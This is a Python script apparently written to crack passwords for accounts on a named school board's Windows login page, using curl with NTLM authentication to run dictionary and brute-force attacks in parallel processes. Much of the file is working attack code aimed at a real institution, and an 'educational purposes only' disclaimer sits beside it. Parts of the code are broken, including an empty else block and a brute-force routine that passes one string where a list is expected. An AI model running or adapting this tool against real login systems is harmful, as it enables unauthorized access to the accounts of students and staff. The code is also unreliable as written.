import itertools
import subprocess
import warnings
from multiprocessing import Pool
import time
import getopt
import sys
from colorama import Fore


dictionary_file = ""

def is_valid_password(args):
    user, password = args
    url = f'https://www.yrdsb.ca/_windows/default.aspx?ReturnUrl='
    command = f'curl -k --ntlm -u "{user}:{password}" -o {user}.html "{url}"'
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print("[+] Testing for password: " + password)
    if "100   120  100   120    0     0" in result.stderr:
        print(Fore.WHITE + f"[!!!] Valid password found: {password}")
        exit()

def generate_password():
    for password_tuple in itertools.product("abcdefghijklmnopqrstuvwxyz0123456789", repeat=8):
        password = "".join(password_tuple)
        if len(set(password)) == 8 and password.count("0") + password.count("1") >= 2:
            return password

def check_passwords(username, passwords):
    with Pool() as pool:
        pool.map(is_valid_password, [(username, password) for password in passwords])

def dic(username):
    global dictionary_file
    try:
        with open(dictionary_file, "r") as password_file:
            passwords = [line.strip() for line in password_file]
    except FileNotFoundError:
        print(Fore.RED + f"[-] No dictionary file by the name of '{dictionary_file}' was found")
        return
    print(Fore.LIGHTGREEN_EX + f"[~] Dictionary list = {dictionary_file}")
    check_passwords(username, passwords)

def brute(username):
    password = generate_password()
    check_passwords(username, password)

def check_config():
    global dictionary_file
    try:
        with open("Keys.txt", "r") as s:
            for i in s.read().split("\n"):
                if "username = " in i:
                    username = i.split('username = "')[1].split('"')[0]
                    print("Username: " + username)
                if "cores = " in i:
                    num_processes = int(i.split('cores = "')[1].split('"')[0])
                    print("Cores: " + str(num_processes))
                if "dictlist = " in i:
                    dictionary_file = i.split('dictlist = "')[1].split('"')[0]
        time.sleep(1)
        return username
    except FileNotFoundError:
        print("Keys.txt not found.")
        input()
        exit()

def main():
    while True:
        z = input(
            "-----------------------\n[0] Exit\n[1] Brute-Force\n[2] Dictionary Attack\n-----------------------\n")
        if z == "0":
            exit()
        elif z == "1":
            print("Please be patient, passwords are generating...")
            brute(check_config())
        elif z == "2":
            dic(check_config())

if __name__ == '__main__':
    opts, args = getopt.getopt(sys.argv[1:], "hu:p:b",["simple","help","username","passwords", "brute-force","quiet"])
    print(Fore.GREEN + """--------------------------------------------------------------------------------------------------------------
__   _____________  ___________  ______                                   _   _____                _    
\ \ / / ___ \  _  \/  ___| ___ \ | ___ \                                 | | /  __ \              | |   
 \ V /| |_/ / | | |\ `--.| |_/ / | |_/ /_ _ ___ _____      _____  _ __ __| | | /  \/_ __ __ _  ___| | __
  \ / |    /| | | | `--. \ ___ \ |  __/ _` / __/ __\ \ /\ / / _ \| '__/ _` | | |   | '__/ _` |/ __| |/ /
  | | | |\ \| |/ / /\__/ / |_/ / | | | (_| \__ \__ \ \ V  V / (_) | | | (_| | | \__/\ | | (_| | (__|   < 
  \_/ \_| \_|___/  \____/\____/  \_|  \__,_|___/___/ \_/\_/ \___/|_|  \__,_|  \____/_|  \__,_|\___|_|\_

--------------------------------------------------------------------------------------------------------------""")
    if any(opt in ('--help', '-h') for opt, _ in opts):
        print(Fore.GREEN + "-h --help:\n"
              f"[~] Usage: python {sys.argv[0]} -u username -p password-list --quiet"
              "\n--------------------------------------------------------------------------------------------------------------"
              f"\nOR python {sys.argv[0]} -u username --brute-force (WIP)"
              f"\nSimple mode --> {sys.argv[0]} --simple"
              "\n--------------------------------------------------------------------------------------------------------------"
              )

    if any(opt in ('--username', '-u') for opt, _ in opts):
        try:
            username = opts[0][1]
        except:
            print(Fore.RED + "[-] Error: You did not provide a username after using the -u or --username operator.")
            exit()
        print(Fore.LIGHTGREEN_EX + f"[~] Username: {username}")
        if any(opt in ('--passwords', '-p') for opt, _ in opts):
            dictionary_file = opts[1][1]
            dic(username)
        elif any(opt in ('--brute-force', '-b') for opt, _ in opts):
            print(Fore.LIGHTGREEN_EX + "[~] Starting brute-force, please be patient.")
            brute(username)
        else:
            print(Fore.RED + "[-] You need to have a password (--passwords or -p) list, or a brute-force (--brute-force or -b) attack option.")
            exit()
    else:
        while True:
            jj = input(Fore.RED + f"[-] Provide an option to run this tool (-h after {sys.argv[0]} for help), do you want to run simple mode? (y/n):\n")
            if jj.lower() not in ["n","y"]:
                print(Fore.RED + "[-] Please type in y for yes or n for no.")
            elif jj.lower == "n":
                exit()
            else:
                




    if any(opt in ('--simple') for opt, _ in opts):
        while True:
            xd = input("[0] Exit\n[1] Start thingy\n[2] Help\n----------------------------\n")
            if xd not in ['0', '1', '2']:
                print(f"Not a valid selection: {xd}")
            elif int(xd) == 0:
                print("bye bye.")
                time.sleep(1)
                exit()
            elif int(xd) == 1:
                main()
            elif int(xd) == 2:
                print("""
[?] This tool is for educational purposes, NOT for any illegal/wrong purposes. I am NOT
responsible for ANY damage that you use with this tool (please, no damages). This is NOT DESIGNED for 
ANY WRONG DOINGS. Do NOT use this tool illegally. That is called INVASION OF PRIVACY and you can go to jail. 
ONLY USE THIS ON YOUR OWN ACCOUNT. Unauthorized access, invasion of privacy, and illegal activities are not only 
unethical but can also lead to legal consequences.
-----------------------------------------------------------------------------------------------------
Just follow the instructions that are going to be listed on the screen, lol
-----------------------------------------------------------------------------------------------------
Press enter to move back to the tool...
""")
                input()


